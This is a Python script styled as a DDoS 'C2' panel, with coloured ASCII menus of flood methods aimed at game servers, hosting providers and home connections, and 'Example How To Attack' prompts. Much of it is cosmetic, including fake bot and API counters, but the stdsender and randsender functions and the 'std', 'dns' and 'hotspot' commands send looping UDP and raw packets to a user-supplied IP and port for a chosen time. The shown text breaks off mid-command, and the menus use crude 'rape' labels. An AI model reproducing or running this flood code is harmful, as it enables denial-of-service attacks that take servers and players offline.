#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#TOOLS AUHTOR TRANSFORMER X BUMBLEBEE
import sys
import socket
import time
import random
import threading
import getpass
import os
import urllib
import json
from time import sleep
nicknm = "ReaperXDeptune"

mt = """
\033[0;36m                 ╔════\x1b[38;2;0;212;14m═════════╦═════════\x1b[38;2;0;186;45m══════════════\x1b[38;2;0;83;168m══════════╗
\033[0;36m                 ║             ╔╦╗╔═╗╦╔╗╔╔╦╗╔═╗╔╗╔╔═╗╔═╗
\033[0;36m                 ║             ║║║╠═╣║║║║ ║ ╠═╣║║║║  ║╣ 
\033[0;36m                 ║             ╩ ╩╩ ╩╩╝╚╝ ╩ ╩ ╩╝╚╝╚═╝╚═╝
\033[0;36m                 ║             👑\033[0;36mMAINTANCE L\033[0;37m WAITING TOOLS👑
\033[0;36m                 ╚════\x1b[38;2;0;212;14m═════════╩═════════\x1b[38;2;0;186;45m══════════════\x1b[38;2;0;83;168m══════════╝
"""

methods = """
\033[0;36m                      ╔╦╗╔═╗╔╦╗╦ ╦╔═╗╔╦╗╔═╗
\033[0;36m                      ║║║║╣  ║ ╠═╣║ ║ ║║╚═╗
\033[0;36m                      ╩ ╩╚═╝ ╩ ╩ ╩╚═╝═╩╝╚═╝
\033[0;36m                      👑METHODS TOOLS DDOS👑
\033[0;36m  ╔═════\x1b[38;2;0;212;14m════════════════════╦═\x1b[38;2;0;186;45m═════════════\x1b[38;2;0;83;168m══════════════╗
\033[0;36m  ║ \033[0;34m1. Game Bypass Methods. Commands = slaprape            \033[0;36m║
\033[0;36m  ║ \033[0;34m2. Layer4. Commands = layer4                         \033[0;36m║
\033[0;36m  ║ \033[0;34m3. VIP. Commands = vip         			 \033[0;36m║
\033[0;36m  ║ \033[0;34m3. Layer7. Commands = layer7        			 \033[0;36m║
\033[0;36m  ║ \033[0;34m3. help. Commands = help         			 \033[0;36m║
\033[0;36m  ║ \033[0;34m3. plan. Commands = plan         			 \033[0;36m║
\033[0;36m  ║ \033[0;34m3. primitive. Commands = primitive         			 \033[0;36m║
\033[0;36m  ║ \033[0;34m3. raw. Commands = raw         			 \033[0;36m║
\033[0;36m  ║ \033[0;34mNon-Copyright Items Issue       		         \033[0;36m║
\033[0;36m ╔╩════\x1b[38;2;0;212;14m═══════════════════╝  ╚══\x1b[38;2;0;186;45m═══════════\x1b[38;2;0;83;168m══════════════╩╗
"""

raw = """
\033[0;36m                         ╦═╗╔═╗╦ ╦  \033[0;37m╔╦╗╔═╗╔╦╗╦ ╦╔═╗╔╦╗╔═╗
\033[0;36m                         ╠╦╝╠═╣║║║\033[0;37m ║║║║╣  ║ ╠═╣║ ║ ║║╚═╗
\033[0;36m                         ╩╚═╩ ╩╚╩╝  \033[0;37m╩ ╩╚═╝ ╩ ╩ ╩╚═╝═╩╝╚═╝
\033[0;36m                              👑\033[0;36mRAW R\033[0;37mMethods👑
\033[0;36m            ╔═══════\x1b[38;2;0;212;14m══════════════════\x1b[38;2;0;186;45m═╦═══════════════\x1b[38;2;0;83;168m═════════════╗
\033[0;36m            ║ \033[0;34mudpraw \033[36m- \033[0;34mRaw UDP Flood \033[0;36m  ║ \033[0;34mhexraw \033[36m- \033[0;34mRaw HEX Flood \033[0;36m    ║
\033[0;36m            ╚╦══════\x1b[38;2;0;212;14m══════════════════\x1b[38;2;0;186;45m╦╩╦══════════════\x1b[38;2;0;83;168m════════════╦╝
\033[0;36m             ║ \033[0;34mtcpraw \033[36m- \033[0;34mRaw TCP Flood \033[0;36m║ ║ \033[0;34mvseraw \033[36m- \033[0;34mRaw VSE Flood \033[0;36m  ║
\033[0;36m             ║ \033[0;34mstdraw \033[36m- \033[0;34mRaw STD Flood \033[0;36m║ ║ \033[0;34msynraw \033[36m- \033[0;34mRaw SYN Flood \033[0;36m  ║
\033[0;36m            ╔╩══════\x1b[38;2;0;212;14m══════════════════\x1b[38;2;0;186;45m╝ ╚═══════════════\x1b[38;2;0;83;168m═══════════╩╗
\033[0;36m            ║    \033[0;34mExample How To Attack\033[93m: \033[31mMETHOD [IP] [TIME] [PORT]   \033[0;36m║
\033[0;36m            ╚═══════\x1b[38;2;0;212;14m══════════════════\x1b[38;2;0;186;45m═════════════════\x1b[38;2;0;83;168m═════════════╝
"""

slaprape = """
\033[0;36m                                    ╔═╗╦  ╔═╗╔═╗\033[0;37m╦═╗╔═╗╔═╗╔═╗
\033[0;36m                                    ╚═╗║  ╠═╣╠═╝\033[0;37m╠╦╝╠═╣╠═╝║╣ 
\033[0;36m                                    ╚═╝╩═╝╩ ╩╩   \033[0;37m ╩╚═╩ ╩╩  ╚═╝
\033[0;36m                                         👑\033[0;36mSLAP M\033[0;37mR RAPE👑
\033[0;36m            ╔══════\x1b[38;2;0;212;14m═════════════════\x1b[38;2;0;186;45m═══╦══════════════\x1b[38;2;0;83;168m══════════════╗
\033[0;36m            ║ \033[0;34movhslav \033[36m- \033[0;34mSlavic Flood \033[0;36m  ║ \033[0;34miotv1 \033[36m- \033[0;34mCustom Method!  \033[0;36m   ║
\033[0;36m            ║ \033[0;34mcpukill \033[36m- \033[0;34mCpu Rape Flood\033[0;36m ║ \033[0;34miotv2 \033[36m- \033[0;34mCustom Method!  \033[0;36m   ║
\033[0;36m            ╚╦═════\x1b[38;2;0;212;14m═════════════════\x1b[38;2;0;186;45m══╦╩╦═════════════\x1b[38;2;0;83;168m═════════════╦╝
\033[0;36m             ║ \033[0;34mfivemkill \033[36m- \033[0;34mfivembypass \033[0;36m║ ║ \033[0;34miotv3 \033[36m-\033[0;34m Custom Method!  \033[0;36m ║
\033[0;36m             ║ \033[0;34micmprape  \033[36m- \033[0;34mICMP Rape  \033[0;36m║ ║ \033[0;34mssdp  \033[36m-\033[0;34m Amped SSDP      \033[0;36m ║
\033[0;36m             ║ \033[0;34mtcprape \033[36m- \033[0;34mRaping TCP   \033[0;36m║ ║ \033[0;34marknull \033[36m- \033[0;34mArk Method    \033[0;36m ║
\033[0;36m             ║ \033[0;34mnforape \033[36m- \033[0;34mNfo Method   \033[0;36m║ ║ \033[0;34m2kdown  \033[36m- \033[0;34mNBA 2K Flood  \033[0;36m ║
\033[0;36m            ╔╩═════\x1b[38;2;0;212;14m═════════════════\x1b[38;2;0;186;45m══╝ ╚══════════════\x1b[38;2;0;83;168m════════════╩╗
\033[0;36m            ║    \033[0;34mExample How To Attack\033[93m: \033[31mMETHOD [IP] [TIME] [PORT]   \033[0;36m║
\033[0;36m            ╚══════\x1b[38;2;0;212;14m═════════════════\x1b[38;2;0;186;45m══════════════════\x1b[38;2;0;83;168m══════════════╝
"""

primitive = """
\033[0;36m                          ╔═╗╦═╗╦╦  ╦╔═╗╔╦╗╔═╗\033[0;37m╔╦╗╔═╗╔╦╗╦ ╦╔═╗╔╦╗╔═╗
\033[0;36m                          ╠═╝╠╦╝║╚╗╔╝╠═╣ ║ ║╣   \033[0;37m║║║║╣  ║ ╠═╣║ ║ ║║╚═╗
\033[0;36m                          ╩  ╩╚═╩ ╚╝ ╩ ╩ ╩ ╚═╝  ╩ ╩\033[0;37m╚═╝ ╩ ╩ ╩╚═╝═╩╝╚═╝
\033[36m                                 👑\033[0;36mPRIVATE M\033[37mY METHODS👑
\033[0;36m            ╔══════\x1b[38;2;0;212;14m═══════════════════\x1b[38;2;0;186;45m═╦══════════════\x1b[38;2;0;83;168m══════════════╗
\033[0;36m            ║ \033[0;34mhomeslap    \033[36m. \033[0;34mr6kill     \033[0;36m║ \033[0;34mfivemtcp  \033[36m. \033[0;34mnfokill       \033[0;36m ║
\033[0;36m            ║ \033[0;34mark255      \033[36m. \033[0;34marklift    \033[0;36m║ \033[0;34mhotspot   \033[36m. \033[0;34mvpn           \033[0;36m ║
\033[0;36m            ║ \033[0;34mhydrakiller \033[36m. \033[0;34markdown    \033[0;36m║ \033[0;34mnfonull   \033[36m. \033[0;34mdhcp          \033[0;36m ║
\033[0;36m            ╚╦═════\x1b[38;2;0;212;14m═══════════════════\x1b[38;2;0;186;45m╦╩╦═════════════\x1b[38;2;0;83;168m═════════════╦╝
\033[0;36m             ║ \033[0;34movhnat    \033[36m. \033[0;34movhamp     \033[0;36m║ ║ \033[0;34movhwdz    \033[36m. \033[0;34movhx         \033[0;36m║
\033[0;36m             ║ \033[0;34mnfodrop   \033[36m. \033[0;34mnfocrush   \033[0;36m║ ║ \033[0;34mnfodown   \033[36m. \033[0;34mnfox         \033[0;36m║
\033[0;36m             ║ \033[0;34mudprape   \033[36m. \033[0;34mudprapev3  \033[0;36m║ ║ \033[0;34mfortnite  \033[36m. \033[0;34mfortnitev2   \033[0;36m║
\033[0;36m             ║ \033[0;34mudprapev2 \033[36m. \033[0;34mudpbypass  \033[0;36m║ ║ \033[0;34mgreeth    \033[36m. \033[0;34mtelnet       \033[0;36m║
\033[0;36m             ║ \033[0;34mfivemv2   \033[36m. \033[0;34mr6drop     \033[0;36m║ ║\033[0;34m r6freeze  \033[36m. \033[0;34mkillall      \033[0;36m║
\033[0;36m             ║ \033[0;34m2krape    \033[36m. \033[0;34mfallguys   \033[0;36m║ ║ \033[0;34movhdown   \033[36m. \033[0;34movhkill      \033[0;36m║
\033[0;36m             ║ \033[0;34mfivemrape \033[36m. \033[0;34mfivemdown  \033[0;36m║ ║ \033[0;34mfivemv1   \033[36m. \033[0;34mfivemslump   \033[0;36m║
\033[0;36m             ║ \033[0;34mkillallv2 \033[36m. \033[0;34mkillallv3  \033[0;36m║ ║ \033[0;34mpowerslap \033[36m. \033[0;34mrapecom      \033[0;36m║
\033[0;36m            ╔╩═════\x1b[38;2;0;212;14m═══════════════════╝ \x1b[38;2;0;186;45m╚══════════════\x1b[38;2;0;83;168m════════════╩╗
\033[0;36m            ║    \033[0;34mExample How To Attack\033[93m: \033[31mMETHOD [IP] [TIME] [PORT]   \033[0;36m║
\033[0;36m            ╚══════\x1b[38;2;0;212;14m════════════════════\x1b[38;2;0;186;45m════════════════\x1b[38;2;0;83;168m═════════════╝
"""

layer4 = """\033[0;36m
\033[0;36m                            ╦  ╔═╗╦ ╦╔═╗╦═╗\033[0;37m ╔═╗╔╦╗╔═╗╔═╗╔╦╗
\033[0;36m                            ║  ╠═╣╚╦╝║╣ ╠╦╝\033[0;37m ║╣ ║║║╠═╝╠═╣ ║ 
\033[0;36m                            ╩═╝╩ ╩ ╩ ╚═╝╩╚═\033[0;37m ╚═╝╩ ╩╩  ╩ ╩ ╩                 
\033[36m                                   👑\033[0;36mLAYER4 M\033[37mY METHODS👑                     
\033[0;36m            ╔════\x1b[38;2;0;212;14m════════════════\x1b[38;2;0;186;45m══════╦═════════\x1b[38;2;0;83;168m═══════════════════╗
\033[0;36m            ║  \033[0;34mudp \033[36m[IP] [TIME] [PORT]  \033[0;36m║   \033[0;34mvse \033[36m[IP] [TIME] [PORT]   \033[0;36m║
\033[0;36m            ║  \033[0;34mtcp \033[36m[IP] [TIME] [PORT]  \033[0;36m║   \033[0;34mack \033[36m[IP] [TIME] [PORT]   \033[0;36m║
\033[0;36m            ╚╦═══\x1b[38;2;0;212;14m════════════════\x1b[38;2;0;186;45m═════╦╩╦════════\x1b[38;2;0;83;168m══════════════════╦╝
\033[0;36m             ║ \033[0;34mstd \033[36m[IP] [TIME] [PORT] \033[0;36m║ ║ \033[0;34mdns \033[36m[IP] [TIME] [PORT]   \033[0;36m║
\033[0;36m             ║ \033[0;34msyn \033[36m[IP] [TIME] [PORT] \033[0;36m║ ║ \033[0;34movh \033[36m[IP] [TIME] [PORT]   \033[0;36m║
\033[0;36m             ║\033[36m- - - - - - - \033[93mhomerape \033[0;34m[IP] [TIME] [PORT] \033[36m- - - - - -\033[0;36m║
\033[0;36m            ╔╩═══\x1b[38;2;0;212;14m════════════════\x1b[38;2;0;186;45m═════╝ ╚═════════\x1b[38;2;0;83;168m═════════════════╩╗
\033[0;36m            ║    \033[0;34mExample How To Attack\033[93m: \033[31mMETHOD [IP] [TIME] [PORT]   \033[0;36m║
\033[0;36m            ╚════\x1b[38;2;0;212;14m════════════════\x1b[38;2;0;186;45m════════════════\x1b[38;2;0;83;168m═══════════════════╝
"""

layer7 = """\033[0;36m
\033[0;36m                             ╦  ╔═╗╦ ╦╔═╗╦═╗\033[0;37m ╔╦╗╦ ╦ ╦╦ ╦╦ ╦
\033[0;36m                             ║  ╠═╣╚╦╝║╣ ╠╦╝\033[0;37m║ ║ ║ ║║ ║╠═╣
\033[0;36m                             ╩═╝╩ ╩ ╩ ╚═╝╩╚═\033[0;37m ╩ ╚═╝╚╝╚═╝╩ ╩                         
\033[36m                                      👑\033[0;36mLAYER7 M\033[37mY METHODS👑                           
\033[0;36m            ╔═════\x1b[38;2;0;212;14m════════════\x1b[38;2;0;186;45m═════════╦══════\x1b[38;2;0;83;168m══════════════════════╗
\033[0;36m            ║  \033[0;34mhttp-stm \033[36m[IP] [TIME] [PORT]  \033[0;36m║	       		 
\033[0;36m            ║  \033[0;34mhttp-cld \033[36m[IP] [TIME] [PORT]  \033[0;36m║		
\033[0;36m            ╚╦════\x1b[38;2;0;212;14m════════════\x1b[38;2;0;186;45m════════╦╩╦═════\x1b[38;2;0;83;168m════════════════════╦╝
\033[0;36m             ║ \033[0;34mddos-guard \033[36m[IP] [TIME] [PORT] \033[0;36m║                          
\033[0;36m             ║ \033[0;34mcloudflare \033[36m[IP] [TIME] [PORT] \033[0;36m║                           
\033[0;36m            ╔╩════\x1b[38;2;0;212;14m════════════\x1b[38;2;0;186;45m════════╝ ╚══════\x1b[38;2;0;83;168m════════════════════╩╗
\033[0;36m            ║    \033[0;34mExample How To Attack\033[93m: \033[31mMETHOD [IP] [TIME] [PORT]   \033[0;36m║
\033[0;36m            ╚═════\x1b[38;2;0;212;14m════════════\x1b[38;2;0;186;45m════════════════\x1b[38;2;0;83;168m══════════════════════╝
"""

banner =  """
\033[36m                         ╦╦  ╦╔═╗╔╗╔  \033[37m╔═╗╦  ╦ ╦╔╦╗╔═╗╔╗╔
\033[36m                         ║╚╗╔╝╠═╣║║║\033[37m╠═╝║  ║ ║ ║ ║ ║║║║
\033[36m                         ╩ ╚╝ ╩ ╩╝╚╝  ╩ \033[37m ╩═╝╚═╝ ╩ ╚═╝╝╚╝
\033[36m                           👑IVAN M\033[37mY PLUTON👑
\033[36m                ╔══\x1b[38;2;0;212;14m══════════════\x1b[38;2;0;186;45m═════════\x1b[38;2;0;83;168m══════════════════════╗
\033[36m                ║\033[37m- - - - - - - IVANXPLUTON C2 By \033[37m@IVANXTRANSFORMER C2 \033[37m- - - - - - -\033[36m ║
\033[36m                ║\033[37m  - - - Type \033[37mhelp\033[37m to see the Help Menu - - -\033[36m   ║
\033[36m                ╚═\x1b[38;2;0;212;14m═════════════════════════\x1b[38;2;0;186;45m════\x1b[38;2;0;83;168m═════════════════╝
\033[36m                ╔══\x1b[38;2;0;212;14m══════════════\x1b[38;2;0;186;45m═════════\x1b[38;2;0;83;168m══════════════════════╗
\033[36m                ╚══\x1b[38;2;0;212;14m══════════════\x1b[38;2;0;186;45m════════════\x1b[38;2;0;83;168m═══════════════════╝
\033[36m                 ╔═\x1b[38;2;0;212;14m════════════\x1b[38;2;0;186;45m═════════\x1b[38;2;0;83;168m═════════════════════╗
\033[36m                 ║\033[37m-       Connection Has Been \033[37m[24/02/2024]║
\033[36m                 ╚═\x1b[38;2;0;212;14m═════════════════════════\x1b[38;2;0;186;45m════\x1b[38;2;0;83;168m═════════════╝
\033[36m                ╔═\x1b[38;2;0;212;14m═════════════════════════\x1b[38;2;0;186;45m════\x1b[38;2;0;83;168m════════════╗
\033[36m                ╚═\x1b[38;2;0;212;14m═════════════════════════\x1b[38;2;0;186;45m════\x1b[38;2;0;83;168m════════════╝
\033[36m                ╔═\x1b[38;2;0;212;14m══════════════════════════════════\x1b[38;2;0;83;168m══════════════════════╗
\033[36m                ║\033[37m- -    Connection Has Been \033[37m(API TOOLS DDOS)- -\033[36m║.                                                        ║ 
\033[36m                ╚═══\x1b[38;2;0;212;14m═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;83;168m══════════════════════╝
"""

attacked =  """
\033[0;36m                 ╔═══\x1b[38;2;0;212;14m═════════\x1b[38;2;0;186;45m═╦═════════════\x1b[38;2;0;83;168m════════════════════╗
\033[0;36m                 ║         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔╦╗╔═╗╦═╗╔╦╗╔═╗╔╦╗
\033[0;36m                 ║         ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗ ║ ╠═╣╠╦╝ ║ ║╣  ║║
\033[0;36m                 ║         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝ ╩ ╩ ╩╩╚═ ╩ ╚═╝═╩╝
\033[0;36m                 ║             👑\033[0;36mATTACKED L\033[0;37m STARTED👑
\033[0;36m                 ╚═══\x1b[38;2;0;212;14m═════════\x1b[38;2;0;186;45m═╩═════════════\x1b[38;2;0;83;168m════════════════════╝
"""

helpservice =  """
\033[0;36m                    ╦ ╦╔═╗╦  ╔═╗\033[0;37m╔═╗╔═╗╦═╗╦  ╦╦╔═╗╔═╗
\033[0;36m                    ╠═╣║╣ ║  ╠═╝\033[0;37m╚═╗║╣ ╠╦╝╚╗╔╝║║  ║╣ 
\033[0;36m                    ╩ ╩╚═╝╩═╝╩\033[0;37m╚═╝╚═╝╩╚═ ╚╝ ╩╚═╝╚═╝
\033[36m                            👑\033[0;36mHELP H\033[37mS SERVICE👑                           
\033[0;36m             ╦════\x1b[38;2;0;212;14m══════════\x1b[38;2;0;186;45m══════════════\x1b[38;2;0;83;168m═══════════════════╦
\033[0;36m	       ║ \033[0;34mMETHODS     ||  ||			   \033[0;36m║
\033[0;36m	       ║ \033[0;34mPLAN        ||  ||			   \033[0;36m║
\033[0;36m	       ║ \033[0;34mVIP         ||  ||			   \033[0;36m║
\033[0;36m	       ║ \033[0;34mLAYER4      ||  ||			   \033[0;36m║
\033[0;36m	       ║ \033[0;34mPRIMITVE    ||  ||			   \033[0;36m║
\033[0;36m	       ║ \033[0;34mSLAPRAPE      ||  ||			   \033[0;36m║
\033[0;36m             ╩════\x1b[38;2;0;212;14m══════════\x1b[38;2;0;186;45m══════════════\x1b[38;2;0;83;168m═══════════════════╩

"""
vip = """
\033[0;36m                                 ╦  ╦╦╔═╗  ╔═╗\033[0;37m╔═╗╔═╗╔═╗╔═╗
\033[0;36m                                 ╚╗╔╝║╠═╝  \033[0;37m╠═╣║  ║  ║╣ ╚═╗
\033[0;36m                                    ╚╝ ╩╩    ╩ ╩\033[0;37m╚═╝╚═╝╚═╝╚═╝
\033[0;36m                                  👑MY VIP ACCESS = \033[0;32mTRUE👑
\033[0;36m                 ╔════\x1b[38;2;0;212;14m═════════╦═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;83;168m══════════════╗
\033[0;36m                 ║ RAW         ║ Shows All VIP Raw Methods       ║
\033[0;36m                 ║ LAYER7      ║ Shows All VIP L7 Methods        ║
\033[0;36m                 ║ PRIMITIVE   ║ Shows All VIP Primitive Methods ║
\033[0;36m                 ║ PIT         ║ Shows All VIP Pit API Methods    ║
\033[0;36m                 ╚════\x1b[38;2;0;212;14m═════════╩═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;83;168m══════════════╝
"""

plan =  """
\033[0;36m                 ╔═════\x1b[38;2;0;212;14m════════╦═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;83;168m══════════════╗
\033[0;36m                 ║          ╔═╗╦  ╔═╗╔╗╔\033[0;37m╔═╗╔═╗╦═╗╦  ╦╦╔═╗╔═╗
\033[0;36m                 ║          ╠═╝║  ╠═╣║║║\033[0;37m ╚═╗║╣ ╠╦╝╚╗╔╝║║  ║╣ 
\033[0;36m                 ║          ╩  ╩═╝╩ ╩╝╚╝\033[0;37m╚═╝╚═╝╩╚═ ╚╝ ╩╚═╝╚═╝
\033[0;36m                 ║              👑\033[0;36mPLAN L\033[0;37m SERVICE👑
\033[0;36m                 ║           \033[0;37mVIP ACCES = TRUE
\033[0;36m                 ║           \033[0;37mUSERNAME = TransformerXSkyreptune                
\033[0;36m                 ║           \033[0;37mADMIN ACCES = TRUE
\033[0;36m                 ║           \033[0;37mEXPIRED TIME = 99000000
\033[0;36m                 ║           \033[0;37mAPI ACCESS = TRUE
\033[0;36m                 ║           \033[0;37mBOTS ACCESS = TRUE
\033[0;36m                 ║           \033[0;37mPLAYER ACCESS = TRUE
\033[0;36m                 ╚═════\x1b[38;2;0;212;14m════════╩════════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;83;168m═════════════╝
"""

bots =  """
\033[0;36m                 ╔═════\x1b[38;2;0;212;14m════════╦═════════════\x1b[38;2;0;186;45m═══════\x1b[38;2;0;83;168m═════════════╗
\033[0;36m                 ║                ╔╗ ╔═╗╔╦╗╔═╗\033[0;37m╔═╗╔═╗╔═╗╔═╗╔═╗
\033[0;36m                 ║                ╠╩╗║ ║ ║ ╚═╗  \033[0;37m╠═╣║  ║  ║╣ ╚═╗
\033[0;36m                 ║                ╚═╝╚═╝ ╩ ╚═╝ \033[0;37m ╩ ╩╚═╝╚═╝╚═╝╚═╝
\033[0;36m                 ║              👑\033[0;36mBOTS L\033[0;37m ACCES👑
\033[0;36m                 ║           \033[0;36mVIP ACCES = \033[0;37m[999999]
\033[0;36m                 ║           \033[0;36mDEVELOPER ACCES = \033[0;37m[999999]                
\033[0;36m                 ║           \033[0;36mADMIN ACCES = \033[0;37m[999999]
\033[0;36m                 ║           \033[0;36mEXPIRED TIME = \033[0;37m[99/99/9999]
\033[0;36m                 ║           \033[0;36mAPI ACCESS = \033[0;37m[99999]
\033[0;36m                 ║           \033[0;36mBOTS ACCESS = \033[0;37m[999999]
\033[0;36m                 ║           \033[0;36mUSER ACCESS = \033[0;37m[99999]
\033[0;36m                 ╚═════\x1b[38;2;0;212;14m════════╩══════════════\x1b[38;2;0;186;45m═══════\x1b[38;2;0;83;168m════════════╝
"""

cooldown = """
\033[0;36m                 ╔═════\x1b[38;2;0;212;14m════════╦══════════════\x1b[38;2;0;186;45m══════\x1b[38;2;0;83;168m═════════════╗
\033[0;36m                 ║             ╦  ╔═╗╔═╗╔╦╗╦╔╗╔╔═╗
\033[0;36m                 ║             ║  ║ ║╠═╣ ║║║║║║║ ╦
\033[0;36m                 ║             ╩═╝╚═╝╩ ╩═╩╝╩╝╚╝╚═╝
\033[0;36m                 ║              👑\033[0;36mLOADING L\033[0;37m TOOLS DDOS👑
\033[0;36m                 ╚═════\x1b[38;2;0;212;14m════════╩══════════════\x1b[38;2;0;186;45m══════\x1b[38;2;0;83;168m═════════════╝
"""

invalid = """\033[0;36mInvalid\033[0;34mCommands"""
cookie = open(".sinfull_cookie","w+")

fsubs = True
tpings = True
pscans = True
liips = True
tattacks = True
uaid = True
said = True
running = True
iaid = True
haid = True
aid = True
attack = True
ldap = True
http = True
atks = True

def randsender(host, timer, port, punch):
	global iaid
	global aid
	global tattacks
	global running

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

	iaid += 1
	aid += 1
	tattacks += 1
	running += 1
	while time.time() < timeout and ldap and attack:
		sock.sendto(punch, (host, int(port)))
	running -= 1
	iaid -= 1
	aid -= 1
              
              


def stdsender(host, port, timer, payload):
	global atks
	global running

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	
	atks += 1
	running += 1
	while time.time() < timeout and attack:
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
	atks -= 1
	running -= 1

def main():
	global fsubs
	global tpings
	global pscans
	global liips
	global tattacks
	global uaid
	global running
	global atk
	global ldap
	global said
	global iaid
	global haid
	global aid
	global attack
	global dp

	while True:
		powerran = (random.randint(666,2109))
		sys.stdout.write("\x1b]2;[-] TransformerXSkyreptune | Api Connected [99999] | Backup Server [99999] | Online User [99999] | Admin: [TransformerXSkyreptune] | POWER : {}% [UNSTABLE]\x07".format (powerran))
		sin = input("\033[0;36m{}\033[0;34m@[C2]\033[36m--> \033[0;31m".format(nicknm)).lower()
		sinput = sin.split(" ")[0]
		if sinput == "clear":
			os.system ("cls")
			print (banner)
			main()
		if sinput == "cls":
			os.system ("cls")
			print (banner)
			main()
		elif sinput == "?":
			os.system ("cls")
			print (banner)
			main()
		elif sinput == "layer4":
			os.system ("cls")
			print (cooldown)
			time.sleep(5)
			os.system ("cls")
			print (layer4)
			main()
		elif sinput == "plan":
			os.system ("cls")
			print (cooldown)
			time.sleep(5)
			os.system ("cls")
			print (plan)
			main()
		elif sinput == "methods":
			os.system ("cls")
			print (cooldown)
			time.sleep(5)
			os.system ("cls")
			print (methods)
			main()
		elif sinput == "bots":
			os.system ("cls")
			print (cooldown)
			time.sleep(5)
			os.system ("cls")
			print (bots)
			main()
		elif sinput =="vip":
			os.system ("cls")
			print (cooldown)
			time.sleep(5)
			os.system ("cls")
			print (vip)
			main()
		elif sinput == "primitive":
			os.system ("cls")
			print (cooldown)
			time.sleep(5)
			os.system ("cls")
			print (primitive)
			main()
		elif sinput == "slaprape":
			os.system ("cls")
			print (cooldown)
			time.sleep(5)
			os.system ("cls")
			print (slaprape)
			main()
		elif sinput == "raw":
			os.system ("cls")
			print (cooldown)
			time.sleep(5)
			os.system ("cls")
			print (raw)
			main()
		elif sinput == "helpservice":
			os.system ("cls")
			print (cooldown)
			time.sleep(5)
			os.system ("cls")
			print (helpservice)
			main()
		elif sinput == "layer7":
			os.system ("cls")
			print (layer7)
			main()
		elif sinput == "pit":
			os.system ("cls")
			print ("pit")
			main()
		elif sinput == "plan":
			os.system ("cls")
			print (cooldown)
			time.sleep(5)
			os.system ("cls")
			print ("plan")
			main()
		elif sinput == "":
			print(invalid)
			main()
		elif sinput == "logout":
			print("Leaving Service in 3 Seconds")
			time.sleep(3)
			os.system ("cls")
			exit()
		elif sinput == "std":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x73\x74\x64\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "dns":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "hotspot":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
